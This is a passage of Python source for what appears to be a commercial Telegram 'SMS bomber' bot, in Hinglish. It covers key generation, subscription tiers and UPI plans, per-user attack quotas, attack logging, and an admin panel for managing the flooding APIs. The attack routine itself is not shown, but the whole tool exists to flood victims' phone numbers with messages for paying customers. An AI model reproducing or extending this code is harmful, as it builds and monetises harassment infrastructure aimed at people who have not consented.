    return max(0, limit - cnt)

def inc_daily(uid):
    if uid == ADMIN_ID: return
    today = now_ist().strftime('%Y-%m-%d')
    cursor.execute("SELECT last_atk_date FROM users WHERE id=?", (uid,))
    row = cursor.fetchone()
    if row:
        if row[0] == today:
            cursor.execute("UPDATE users SET daily_attacks=daily_attacks+1 WHERE id=?", (uid,))
        else:
            cursor.execute("UPDATE users SET daily_attacks=1, last_atk_date=? WHERE id=?", (today, uid))
    db.commit()

def update_seen(uid):
    cursor.execute("UPDATE users SET last_seen=? WHERE id=?",
                   (now_ist().strftime('%Y-%m-%d %H:%M:%S'), uid)); db.commit()

async def check_join(uid, bot):
    if gs('force_join') != 'on' or not FORCE_CHANNEL or FORCE_CHANNEL == "": return True
    try:
        m = await bot.get_chat_member(FORCE_CHANNEL, uid)
        return m.status not in [ChatMember.LEFT, ChatMember.BANNED]
    except: return True

async def verify_tier(uid, ctx=None):
    cursor.execute("SELECT tier,expiry,banned FROM users WHERE id=?", (uid,))
    res = cursor.fetchone()
    if not res: return 'free', 0
    tier, exp, banned = res
    if banned == 1: return 'banned', 1
    if tier in ['trial','bronze','silver','gold','premium','elite'] and exp and exp != '0':
        try:
            if now_ist() > datetime.strptime(exp, '%Y-%m-%d %H:%M:%S'):
                cursor.execute("UPDATE users SET tier='free',expiry='0' WHERE id=?", (uid,)); db.commit()
                if ctx:
                    try:
                        await ctx.bot.send_message(uid,
                            f"⚠️ <b>PLAN EXPIRED!</b>\n{L1}\n{tb(tier)} plan khatam!\n💳 Renew: /buy\n{ADMIN_USERNAME}",
                            parse_mode=ParseMode.HTML)
                    except: pass
                return 'free', 0
        except: pass
    return tier, banned

# ══════════════════════════════════════════════════════════════
#               🔑 KEY ACCESS SYSTEM — CORE HELPERS
# ══════════════════════════════════════════════════════════════
def get_key_session(uid: int):
    cursor.execute("SELECT key_code,tier,activated_at,expires_at,max_attacks,daily_attacks_limit,max_concurrent,total_attacks_used,daily_attacks_used,last_atk_date FROM user_key_sessions WHERE user_id=?", (uid,))
    row = cursor.fetchone()
    if not row: return None
    key_code, tier, activated_at, expires_at, max_atk, daily_lim, max_conc, total_used, daily_used, last_date = row
    if not expires_at: return None
    try:
        exp_dt = datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S')
        if now_ist() > exp_dt:
            cursor.execute("DELETE FROM user_key_sessions WHERE user_id=?", (uid,))
            db.commit()
            return None
    except: return None
    today = now_ist().strftime('%Y-%m-%d')
    if last_date != today:
        cursor.execute("UPDATE user_key_sessions SET daily_attacks_used=0, last_atk_date=? WHERE user_id=?", (today, uid))
        db.commit()
        daily_used = 0
    return {
        'key_code': key_code, 'tier': tier,
        'activated_at': activated_at, 'expires_at': expires_at,
        'max_attacks': max_atk, 'daily_limit': daily_lim,
        'max_concurrent': max_conc,
        'total_used': total_used, 'daily_used': daily_used,
        'last_date': last_date,
    }

def key_time_remaining(expires_at: str) -> str:
    try:
        exp_dt = datetime.strptime(expires_at, '%Y-%m-%d %H:%M:%S')
        rem = exp_dt - now_ist()
        if rem.total_seconds() <= 0: return "⏰ EXPIRED"
        total_s = int(rem.total_seconds())
        d = total_s // 86400; total_s %= 86400
        h = total_s // 3600;  total_s %= 3600
        m = total_s // 60;    s = total_s % 60
        if d > 0:   return f"{d}d {h}h {m}m"
        elif h > 0: return f"{h}h {m}m {s}s"
        else:       return f"{m}m {s}s"
    except: return "N/A"

def activate_key_for_user(uid: int, key_code: str) -> tuple:
    cursor.execute("SELECT tier,duration_mins,max_attacks,daily_attacks,max_concurrent,max_uses,used_count,note FROM access_keys WHERE key_code=?", (key_code,))
    row = cursor.fetchone()
    if not row: return False, "❌ Invalid key! Key nahi mila."
    tier, dur_mins, max_atk, daily_atk, max_conc, max_uses, used_count, note = row
    if used_count >= max_uses: return False, "❌ Key already use ho chuka hai!"
    existing = get_key_session(uid)
    if existing: return False, f"❌ Tera active session chal raha hai!\n⏳ Time: <code>{key_time_remaining(existing['expires_at'])}</code>\nPehle expire hone de ya admin se contact karo."
    now_s = now_ist()
    activated_at = now_s.strftime('%Y-%m-%d %H:%M:%S')
    expires_at   = (now_s + timedelta(minutes=dur_mins)).strftime('%Y-%m-%d %H:%M:%S')
    today        = now_s.strftime('%Y-%m-%d')
    cursor.execute("""INSERT OR REPLACE INTO user_key_sessions
        (user_id,key_code,tier,activated_at,expires_at,max_attacks,daily_attacks_limit,max_concurrent,total_attacks_used,daily_attacks_used,last_atk_date)
        VALUES (?,?,?,?,?,?,?,?,0,0,?)""",
        (uid, key_code, tier, activated_at, expires_at, max_atk, daily_atk, max_conc, today))
    cursor.execute("UPDATE access_keys SET used_count=used_count+1 WHERE key_code=?", (key_code,))
    cursor.execute("UPDATE users SET tier=?, expiry=? WHERE id=?", (tier, expires_at, uid))
    db.commit()
    return True, f"✅ Key activated!\n{tb(tier)} | {key_time_remaining(expires_at)}"

def key_can_attack(uid: int) -> tuple:
    if uid == ADMIN_ID: return True, ""
    sess = get_key_session(uid)
    if not sess: return False, "🔑 Koi active key nahi hai!\n/key se key activate karo."
    if sess['max_attacks'] > 0 and sess['total_used'] >= sess['max_attacks']:
        return False, f"🚫 Total attack limit reach!\n📊 Used: {sess['total_used']}/{sess['max_attacks']}\n🔑 Naya key chahiye."
    if sess['daily_limit'] > 0 and sess['daily_used'] >= sess['daily_limit']:
        return False, f"🚫 Aaj ka attack limit khatam!\n📅 Daily: {sess['daily_used']}/{sess['daily_limit']}\n⏰ Kal reset hoga."
    user_running = sum(1 for u in active_tasks if u == uid)
    if sess['max_concurrent'] > 0 and user_running >= sess['max_concurrent']:
        return False, f"🚫 Max {sess['max_concurrent']} concurrent attack allowed!\n🛑 Pehla attack rok kar dobara try karo."
    return True, ""

def key_inc_attack(uid: int):
    if uid == ADMIN_ID: return
    today = now_ist().strftime('%Y-%m-%d')
    cursor.execute("UPDATE user_key_sessions SET total_attacks_used=total_attacks_used+1, daily_attacks_used=daily_attacks_used+1, last_atk_date=? WHERE user_id=?", (today, uid))
    db.commit()

async def auto_stop_expired_keys(bot):
    while True:
        try:
            await asyncio.sleep(10)
            for uid in list(active_tasks.keys()):
                if uid == ADMIN_ID: continue
                sess = get_key_session(uid)
                if sess is None:
                    task = active_tasks.pop(uid, None)
                    if task and not task.done():
                        task.cancel()
                    try:
                        await bot.send_message(uid,
                            f"╔══ ⏰ KEY EXPIRED — ATTACK STOPPED ══╗\n{L1}\n"
                            f"🔴 Tera key expire ho gaya!\n"
                            f"⚡ Running attack auto-stop ho gaya.\n"
                            f"{L1}\n"
                            f"🔑 Naya key lo: <code>/key YOUR_KEY</code>\n"
                            f"💳 Buy: /buy\n"
                            f"Admin: {ADMIN_USERNAME}\n╚{'═'*30}╝",
                            parse_mode=ParseMode.HTML)
                    except: pass
        except Exception as e:
            logging.error(f"auto_stop_expired_keys error: {e}")
            await asyncio.sleep(30)

# ── Admin: Generate Key Command ──
async def genkey_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if len(ctx.args) < 2:
        return await update.message.reply_text(
            f"╔══ 🔑 GEN KEY HELP ══╗\n{L1}\n"
            f"<b>Usage:</b>\n"
            f"<code>/genkey TIER MINS [MAX_ATK] [DAILY] [CONCURRENT] [MAX_USES] [NOTE]</code>\n\n"
            f"<b>Examples:</b>\n"
            f"<code>/genkey bronze 60</code>  — 1h bronze, unlimited\n"
            f"<code>/genkey gold 1440 100 20 2 1</code>  — 1day gold, 100 total, 20/day, 2 at once\n"
            f"<code>/genkey elite 1</code>  — 1min elite test key\n"
            f"<code>/genkey silver 30 50 10 1 3 group_buy</code>  — 3 uses\n\n"
            f"<b>Tiers:</b> trial, bronze, silver, gold, premium, elite\n"
            f"<b>-1</b> = unlimited\n"
            f"{L1}\n"
            f"<code>/keylist</code> — All keys\n"
            f"<code>/delkey CODE</code> — Delete key\n"
            f"╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)
    try:
        tier_k   = ctx.args[0].lower()
        dur_mins = int(ctx.args[1])
        max_atk  = int(ctx.args[2]) if len(ctx.args) > 2 else -1
        daily_atk= int(ctx.args[3]) if len(ctx.args) > 3 else -1
        max_conc = int(ctx.args[4]) if len(ctx.args) > 4 else 1
        max_uses = int(ctx.args[5]) if len(ctx.args) > 5 else 1
        note     = ctx.args[6] if len(ctx.args) > 6 else ''
        valid_tiers = ['trial','bronze','silver','gold','premium','elite']
        if tier_k not in valid_tiers:
            return await update.message.reply_text(f"❌ Valid tiers: {', '.join(valid_tiers)}")
        if dur_mins < 1:
            return await update.message.reply_text("❌ Duration min 1 minute hona chahiye!")
        key_code = f"AGS-{rand_code(4)}-{rand_code(4)}-{rand_code(4)}"
        now_s    = now_ist().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute("""INSERT INTO access_keys
            (key_code,tier,duration_mins,max_attacks,daily_attacks,max_concurrent,max_uses,used_count,created_by,created_at,note)
            VALUES (?,?,?,?,?,?,?,0,?,?,?)""",
            (key_code, tier_k, dur_mins, max_atk, daily_atk, max_conc, max_uses, ADMIN_ID, now_s, note))
        db.commit()
        if dur_mins >= 1440:
            dur_txt = f"{dur_mins//1440}d {(dur_mins%1440)//60}h"
        elif dur_mins >= 60:
            dur_txt = f"{dur_mins//60}h {dur_mins%60}m"
        else:
            dur_txt = f"{dur_mins}m"
        await update.message.reply_text(
            f"╔══ 🔑 KEY GENERATED! ══╗\n{L1}\n"
            f"🗝️ <b>Key:</b>\n<code>{key_code}</code>\n\n"
            f"{L1}\n"
            f"💎 <b>Tier:</b>        {tb(tier_k)}\n"
            f"⏱️ <b>Duration:</b>    {dur_txt}\n"
            f"⚔️  <b>Max Attacks:</b> {'∞' if max_atk == -1 else max_atk}\n"
            f"📅 <b>Daily Attacks:</b> {'∞' if daily_atk == -1 else daily_atk}\n"
            f"🔀 <b>Concurrent:</b>  {max_conc}\n"
            f"🎟️ <b>Max Uses:</b>    {max_uses}\n"
            f"{f'📝 Note: {note}' if note else ''}\n"
            f"{L1}\n"
            f"User ko bhejo:\n<code>/key {key_code}</code>\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Format error. /genkey for help.")

async def genbulk_key_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if len(ctx.args) < 3:
        return await update.message.reply_text("❌ <code>/genbulkkey COUNT TIER MINS</code>", parse_mode=ParseMode.HTML)
    try:
        count    = min(int(ctx.args[0]), 50)
        tier_k   = ctx.args[1].lower()
        dur_mins = int(ctx.args[2])
        max_atk  = int(ctx.args[3]) if len(ctx.args) > 3 else -1
        daily_atk= int(ctx.args[4]) if len(ctx.args) > 4 else -1
        max_conc = int(ctx.args[5]) if len(ctx.args) > 5 else 1
        now_s = now_ist().strftime('%Y-%m-%d %H:%M:%S')
        keys = []
        for _ in range(count):
            kc = f"AGS-{rand_code(4)}-{rand_code(4)}-{rand_code(4)}"
            cursor.execute("""INSERT INTO access_keys
                (key_code,tier,duration_mins,max_attacks,daily_attacks,max_concurrent,max_uses,used_count,created_by,created_at)
                VALUES (?,?,?,?,?,?,1,0,?,?)""",
                (kc, tier_k, dur_mins, max_atk, daily_atk, max_conc, ADMIN_ID, now_s))
            keys.append(kc)
        db.commit()
        key_list = "\n".join(f"<code>{k}</code>" for k in keys)
        dur_txt = f"{dur_mins//60}h {dur_mins%60}m" if dur_mins >= 60 else f"{dur_mins}m"
        await update.message.reply_text(
            f"╔══ 🔑 BULK KEYS ({count}) ══╗\n{L1}\n"
            f"💎 {tb(tier_k)} | ⏱️ {dur_txt}\n{L1}\n"
            f"{key_list}\n{L1}\n"
            f"Use: <code>/key KEY_CODE</code>\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Format error.")

async def keylist_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    cursor.execute("SELECT key_code,tier,duration_mins,max_attacks,daily_attacks,max_concurrent,max_uses,used_count,created_at,note FROM access_keys ORDER BY id DESC LIMIT 30")
    rows = cursor.fetchall()
    if not rows: return await update.message.reply_text("❌ Koi key nahi hai.")
    txt = f"╔══ 🔑 KEY LIST ══╗\n{L1}\n"
    for kc, tier_k, dur, ma, da, mc, mu, uc, cat, note in rows:
        status = "✅ ACTIVE" if uc < mu else "🔴 USED"
        dur_txt = f"{dur//60}h" if dur >= 60 else f"{dur}m"
        txt += (f"{status} <code>{kc}</code>\n"
                f"   {tb(tier_k)} | {dur_txt} | Atk:{('∞' if ma==-1 else ma)} | Day:{('∞' if da==-1 else da)} | Con:{mc} | {uc}/{mu} used\n"
                + (f"   📝 {note}\n" if note else "") + "\n")
    txt += f"╚{'═'*27}╝"
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

async def delkey_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not ctx.args: return await update.message.reply_text("❌ /delkey KEY_CODE")
    kc = ctx.args[0].strip().upper()
    cursor.execute("DELETE FROM access_keys WHERE key_code=?", (kc,))
    if cursor.rowcount > 0:
        db.commit()
        await update.message.reply_text(f"✅ Key deleted: <code>{kc}</code>", parse_mode=ParseMode.HTML)
    else:
        await update.message.reply_text("❌ Key nahi mila.")

async def keystatus_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not ctx.args: return await update.message.reply_text("❌ /keystatus UID")
    try:
        t_uid = int(ctx.args[0])
        sess = get_key_session(t_uid)
        if not sess:
            return await update.message.reply_text(f"❌ UID {t_uid} ka koi active session nahi hai.")
        await update.message.reply_text(
            f"╔══ 🔑 KEY SESSION ══╗\n{L1}\n"
            f"👤 UID: <code>{t_uid}</code>\n"
            f"🗝️ Key: <code>{sess['key_code']}</code>\n"
            f"💎 Tier: {tb(sess['tier'])}\n"
            f"⏱️ Expires: <code>{sess['expires_at']}</code>\n"
            f"   Remaining: <code>{key_time_remaining(sess['expires_at'])}</code>\n"
            f"⚔️  Attacks: {sess['total_used']}/{('∞' if sess['max_attacks']==-1 else sess['max_attacks'])}\n"
            f"📅 Daily: {sess['daily_used']}/{('∞' if sess['daily_limit']==-1 else sess['daily_limit'])}\n"
            f"🔀 Concurrent: max {sess['max_concurrent']}\n"
            f"╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)
    except ValueError:
        await update.message.reply_text("❌ Invalid UID.")

async def revokekey_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not ctx.args: return await update.message.reply_text("❌ /revokekey UID")
    try:
        t_uid = int(ctx.args[0])
        cursor.execute("DELETE FROM user_key_sessions WHERE user_id=?", (t_uid,))
        cursor.execute("UPDATE users SET tier='free', expiry='0' WHERE id=?", (t_uid,))
        db.commit()
        task = active_tasks.pop(t_uid, None)
        if task and not task.done(): task.cancel()
        await update.message.reply_text(f"✅ UID {t_uid} ka key session revoked!")
        try:
            await ctx.bot.send_message(t_uid,
                f"⚠️ <b>Access Revoked!</b>\n{L1}\nAdmin ne tera key session hataya.\nAdmin: {ADMIN_USERNAME}",
                parse_mode=ParseMode.HTML)
        except: pass
    except ValueError:
        await update.message.reply_text("❌ Invalid UID.")

# ── User: /key command to activate key ──
async def key_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.username or 'Unknown'
    fname = update.effective_user.first_name or ''
    if uid != ADMIN_ID:
        joined = await check_join(uid, ctx.bot)
        if not joined:
            return await update.message.reply_text(
                f"╔══ ⚠️ JOIN REQUIRED ══╗\n{L1}\n"
                f"🔴 Pehle channel join karo!\n📢 {FORCE_CHANNEL}\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML, reply_markup=join_kb())
    if not ctx.args:
        sess = get_key_session(uid)
        if sess:
            return await update.message.reply_text(
                f"╔══ 🔑 YOUR ACCESS KEY ══╗\n{L1}\n"
                f"✅ <b>Active Session!</b>\n"
                f"💎 Tier: {tb(sess['tier'])}\n"
                f"⏱️ Time Left: <code>{key_time_remaining(sess['expires_at'])}</code>\n"
                f"⚔️  Attacks: {sess['total_used']}/{('∞' if sess['max_attacks']==-1 else sess['max_attacks'])}\n"
                f"📅 Daily: {sess['daily_used']}/{('∞' if sess['daily_limit']==-1 else sess['daily_limit'])}\n"
                f"🔀 Concurrent: max {sess['max_concurrent']}\n"
                f"{L1}\n<i>/bomb NUMBER se attack karo!</i>\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML)
        return await update.message.reply_text(
            f"╔══ 🔑 KEY ACTIVATE ══╗\n{L1}\n"
            f"📌 Usage: <code>/key YOUR_KEY_CODE</code>\n\n"
            f"💳 Key kharidne ke liye:\n"
            f"  → /buy\n"
            f"  → Admin: {ADMIN_USERNAME}\n"
            f"{L1}\n<i>Key milte hi /key CODE type karo!</i>\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)
    code = ctx.args[0].strip().upper()
    now_s = now_ist().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute("SELECT id FROM users WHERE id=?", (uid,))
    if not cursor.fetchone():
        cursor.execute("INSERT INTO users (id,username,first_name,tier,expiry,joined_at,last_seen) VALUES (?,?,?,'free','0',?,?)",
                       (uid, uname, fname, now_s, now_s))
        db.commit()
    success, msg = activate_key_for_user(uid, code)
    if success:
        sess = get_key_session(uid)
        dur_txt = key_time_remaining(sess['expires_at']) if sess else "N/A"
        await update.message.reply_text(
            f"╔══ 🔑 KEY ACTIVATED! ══╗\n{L1}\n"
            f"🎉 <b>Access Granted!</b>\n\n"
            f"💎 <b>Tier:</b>    {tb(sess['tier']) if sess else ''}\n"
            f"⏱️ <b>Time:</b>    <code>{dur_txt}</code>\n"
            f"⚔️  <b>Attacks:</b> {('∞' if sess['max_attacks']==-1 else sess['max_attacks']) if sess else '?'}\n"
            f"📅 <b>Daily:</b>   {('∞' if sess['daily_limit']==-1 else sess['daily_limit']) if sess else '?'}\n"
            f"🔀 <b>Concurrent:</b> {sess['max_concurrent'] if sess else 1}\n"
            f"{L1}\n"
            f"🚀 Ab /bomb NUMBER se attack karo!\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("💣 SMS BOMB", callback_data='nav_sms'),
                InlineKeyboardButton("📊 My Session", callback_data='nav_key_status')]]))
        try:
            await ctx.bot.send_message(ADMIN_ID,
                f"╔══ 🔑 KEY ACTIVATED ══╗\n{L1}\n"
                f"👤 @{uname} ({fname})\n"
                f"🆔 <code>{uid}</code>\n"
                f"🗝️ Key: <code>{code}</code>\n"
                f"💎 Tier: {tb(sess['tier']) if sess else ''}\n"
                f"⏱️ Duration: {dur_txt}\n╚{'═'*27}╝",
                parse_mode=ParseMode.HTML)
        except: pass
    else:
        await update.message.reply_text(
            f"╔══ ❌ KEY ERROR ══╗\n{L1}\n{msg}\n{L1}\n"
            f"💳 Buy key: /buy\nAdmin: {ADMIN_USERNAME}\n╚{'═'*27}╝",
            parse_mode=ParseMode.HTML)

def log_atk(uid, target, atype, hits=0, dropped=0, dur=0):
    cursor.execute("INSERT INTO attack_logs (user_id,target,attack_type,hits,dropped,duration,timestamp) VALUES (?,?,?,?,?,?,?)",
                   (uid,target,atype,hits,dropped,dur,now_ist().strftime('%Y-%m-%d %H:%M:%S')))
    cursor.execute("UPDATE users SET total_sent=total_sent+?, total_attacks=total_attacks+1 WHERE id=?", (hits,uid))
    db.commit()

# ══════════════════════════════════════════════════════════════
#                    ⌨️ KEYBOARDS
# ══════════════════════════════════════════════════════════════
def main_kb(uid, tier='free'):
    vip   = is_vip(tier) or uid == ADMIN_ID
    lock  = "🔒"
    kb = [
        [InlineKeyboardButton("⚡ ═══ NEXUS COMBAT ZONE ═══ ⚡", callback_data='nav_noop')],
        [InlineKeyboardButton("💣 SMS BOMB",                      callback_data='nav_sms'),
         InlineKeyboardButton("🛑 ABORT STRIKE",                  callback_data='nav_stop')],
        [InlineKeyboardButton("🛡️ QUANTUM SHIELD",                callback_data='nav_shield')],
        [InlineKeyboardButton("📊 WAR PROFILE",                   callback_data='nav_profile'),
         InlineKeyboardButton("🌐 API STATUS",                    callback_data='nav_api_health')],
        [InlineKeyboardButton("💎 ═══ ACCESS & VIP ═══ 💎",          callback_data='nav_noop')],
        [InlineKeyboardButton("💳 BUY KEY/VIP PLANS",                callback_data='nav_buy'),
         InlineKeyboardButton("🔑 ENTER KEY",                        callback_data='nav_enter_key')],
        [InlineKeyboardButton("📊 MY KEY STATUS",                    callback_data='nav_key_status'),
         InlineKeyboardButton("ℹ️ BOT INFO",                         callback_data='nav_info')],
    ]
    if uid == ADMIN_ID:
        kb.append([InlineKeyboardButton(
            "🤖 ╔══ ADMIN AI NEXUS PANEL ══╗ 🤖", callback_data='nav_admin')])
    return InlineKeyboardMarkup(kb)

def admin_kb(page=1):
    if page == 1:
        return InlineKeyboardMarkup([
            [InlineKeyboardButton("╔══ 🤖 AGS AI NEXUS CONTROL v9000 ══╗", callback_data='adm_noop')],
            [InlineKeyboardButton("📊 LIVE STATS", callback_data='adm_stats'),
             InlineKeyboardButton("📡 RESOURCES",  callback_data='adm_resmon'),
             InlineKeyboardButton("🌐 API HEALTH", callback_data='adm_api_health')],
            [InlineKeyboardButton("━━━━ 👥 USER CONTROL CENTER ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("👥 All Users",   callback_data='adm_users'),
             InlineKeyboardButton("🔍 Deep Lookup", callback_data='adm_lookup'),
             InlineKeyboardButton("📜 Atk Logs",    callback_data='adm_logs')],
            [InlineKeyboardButton("👑 Give VIP",    callback_data='adm_give'),
             InlineKeyboardButton("❌ Revoke VIP",  callback_data='adm_revoke'),
             InlineKeyboardButton("👑 Mass VIP",    callback_data='adm_mass_vip')],
            [InlineKeyboardButton("🚫 Ban User",    callback_data='adm_ban'),
             InlineKeyboardButton("✅ Unban",       callback_data='adm_unban'),
             InlineKeyboardButton("🎯 Limits",      callback_data='adm_climit')],
            [InlineKeyboardButton("📊 User Report", callback_data='adm_user_report'),
             InlineKeyboardButton("🔔 Expiry Alert",callback_data='adm_expiry_notif'),
             InlineKeyboardButton("📣 Notify All",  callback_data='adm_notify_expiring')],
            [InlineKeyboardButton("━━━━ 🔑 KEY MANAGEMENT ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("🔑 Gen Key",     callback_data='adm_genkey_help'),
             InlineKeyboardButton("📋 Key List",    callback_data='adm_keylist'),
             InlineKeyboardButton("🗑️ Del Key",     callback_data='adm_delkey')],
            [InlineKeyboardButton("📊 Key Status",  callback_data='adm_keystatus'),
             InlineKeyboardButton("🚫 Revoke Key",  callback_data='adm_revokekey'),
             InlineKeyboardButton("📦 Bulk Keys",   callback_data='adm_bulkkey')],
            [InlineKeyboardButton("━━━━ 💰 PAYMENT VAULT ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("💰 All Payments",callback_data='adm_payments'),
             InlineKeyboardButton("✅ Verify Pay",  callback_data='adm_vpay'),
             InlineKeyboardButton("💳 UPI Change",  callback_data='adm_upi_change')],
            [InlineKeyboardButton("💹 Revenue Report", callback_data='adm_revenue'),
             InlineKeyboardButton("📈 Stats Graph",    callback_data='adm_stats_graph')],
            [InlineKeyboardButton("━━━━ 🛒 PLAN ENGINE ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("📋 View Plans",  callback_data='adm_plans_list'),
             InlineKeyboardButton("➕ Add Plan",    callback_data='adm_plan_add'),
             InlineKeyboardButton("❌ Del Plan",    callback_data='adm_plan_del')],
            [InlineKeyboardButton("✏️ Edit Plan",   callback_data='adm_plan_edit'),
             InlineKeyboardButton("🔄 Toggle Plan", callback_data='adm_plan_toggle')],
            [InlineKeyboardButton("━━━━ 📡 API NEXUS CENTER ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("➕ Add GET API", callback_data='adm_api_add'),
             InlineKeyboardButton("📋 GET APIs",    callback_data='adm_api_list'),
             InlineKeyboardButton("🗑️ Del API",     callback_data='adm_api_del')],
            [InlineKeyboardButton("🔥 BLX POST APIs",callback_data='adm_blx_manager'),
             InlineKeyboardButton("⚠️ API Status",  callback_data='adm_api_errmsg'),
             InlineKeyboardButton("🔬 Deep Ping",   callback_data='adm_deep_ping')],
            [InlineKeyboardButton("📞 Ping Numbers",callback_data='adm_ping_nums'),
             InlineKeyboardButton("🛡️ Admin WL",    callback_data='adm_whitelist'),
             InlineKeyboardButton("🔄 Retry Config",callback_data='adm_retry_cfg')],
            [InlineKeyboardButton("━━━━ 💬 BROADCAST ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("📣 Broadcast All",callback_data='adm_brd'),
             InlineKeyboardButton("💎 VIP Broadcast",callback_data='adm_brd_vip')],
            [InlineKeyboardButton("━━━━ ⚙️ SYSTEM CONTROL ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("🎟️ Gen Coupon",  callback_data='adm_cpn_help'),
             InlineKeyboardButton("📋 Coupons",     callback_data='adm_cpn_list'),
             InlineKeyboardButton("⚙️ Settings",    callback_data='adm_settings')],
            [InlineKeyboardButton("📣 Force Join",  callback_data='adm_fj_menu'),
             InlineKeyboardButton("🛡️ Whitelist",   callback_data='adm_wl_clear')],
            [InlineKeyboardButton("━━━━ 🎯 PER-TIER LIMIT ENGINE ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("🎯 Tier Limits",  callback_data='adm_tier_limits'),
             InlineKeyboardButton("📊 View Limits",  callback_data='adm_view_limits'),
             InlineKeyboardButton("🔄 Reset Limits", callback_data='adm_reset_limits')],
            [InlineKeyboardButton("━━━━ 🔬 ADVANCED AI TOOLS ━━━━", callback_data='adm_noop')],
            [InlineKeyboardButton("🖼️ Set Banner",  callback_data='adm_set_banner'),
             InlineKeyboardButton("🗑️ Clear Spins", callback_data='adm_clear_spins'),
             InlineKeyboardButton("🔔 Expiry Notif",callback_data='adm_expiry_notif')],
            [InlineKeyboardButton("📊 Full Report", callback_data='adm_full_report'),
             InlineKeyboardButton("🧹 DB Cleanup",  callback_data='adm_db_cleanup'),
             InlineKeyboardButton("🚧 Maintenance", callback_data='adm_mnt')],
            [InlineKeyboardButton("🔙 Main Menu",   callback_data='nav_back')],
        ])
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='nav_admin')]])

def buy_kb(category=None):
    rows = []
    all_plans = get_plans()
    if category is None:
        micro_c = sum(1 for p in all_plans.values() if p.get('category','mid')=='micro')
        low_c  = sum(1 for p in all_plans.values() if p.get('category','mid')=='low')
        mid_c  = sum(1 for p in all_plans.values() if p.get('category','mid')=='mid')
        high_c = sum(1 for p in all_plans.values() if p.get('category','mid')=='high')
        if micro_c > 0:
            rows.append([InlineKeyboardButton(f"⚡ MICRO/FLASH ({micro_c} plans) — ₹20+", callback_data='buy_cat_micro')])
        rows += [
            [InlineKeyboardButton(f"💸 LOW RANGE ({low_c} plans)",   callback_data='buy_cat_low')],
            [InlineKeyboardButton(f"⚡ MID RANGE ({mid_c} plans)",   callback_data='buy_cat_mid')],
            [InlineKeyboardButton(f"💎 HIGH RANGE ({high_c} plans)", callback_data='buy_cat_high')],
            [InlineKeyboardButton("🔙 Back", callback_data='nav_back')],
        ]
    else:
        for pk, info in all_plans.items():
            if info.get('category','mid') != category: continue
            op = info['price']
            fp = op  # discount removed
            if info.get('hours', 0) > 0:
                dur = f"{info['hours']}h"
            elif info.get('days',0) > 1000:
                dur = "Lifetime ♾️"
            else:
                dur = f"{info.get('days',0)}d"
            price_show = f"₹{fp}"
            rows.append([InlineKeyboardButton(
                f"{info['label']} — {price_show} / {dur}",
                callback_data=f'buy_{pk}')])
        if not rows or (len(rows)==1 and 'Back' in rows[0][0].text):
            rows.append([InlineKeyboardButton("📭 No plans in this category", callback_data='nav_buy')])
        rows.append([InlineKeyboardButton("🔙 Back to Categories", callback_data='nav_buy')])
    return InlineKeyboardMarkup(rows)

def shield_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Shield Number", callback_data='wl_add_num'),
         InlineKeyboardButton("💳 Shield UPI",    callback_data='wl_add_upi')],
        [InlineKeyboardButton("📋 View Shield",   callback_data='wl_view'),
         InlineKeyboardButton("🗑️ Remove Entry",  callback_data='wl_remove')],
        [InlineKeyboardButton("🔙 Main Menu",     callback_data='nav_back')],
    ])

def stop_kb(uid):
    return InlineKeyboardMarkup([[InlineKeyboardButton(f"🛑 STOP NOW (UID:{uid})", callback_data=f'astop_{uid}')]])

def back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data='nav_back')]])

def cancel_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data='nav_back')]])

def upsell_kb(txt="💎 UPGRADE NOW"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(txt, callback_data='nav_buy')]])

def join_kb():
    btns = []
    if FORCE_CHANNEL:
        btns.append([InlineKeyboardButton("📢 Join Channel Now", url=f"https://t.me/{FORCE_CHANNEL.lstrip('@')}")])
    btns.append([InlineKeyboardButton("✅ I've Joined!", callback_data='check_join')])
    return InlineKeyboardMarkup(btns)

def welcome_ui(tier, fname='', is_new=False):
    color = tc(tier); badge = tb(tier)
    lim   = get_atk_per_day(0, tier)
    rnds  = TIER_DATA.get(tier,{}).get('rounds', 30)
    t_banner = TIER_BANNERS.get(tier, L1)
    t_glow   = TIER_GLOWS.get(tier, '○ ○ ○ ○ ○')
    f_icon = random.choice(FIRE)
    ai_icon = random.choice(AI_ICONS)

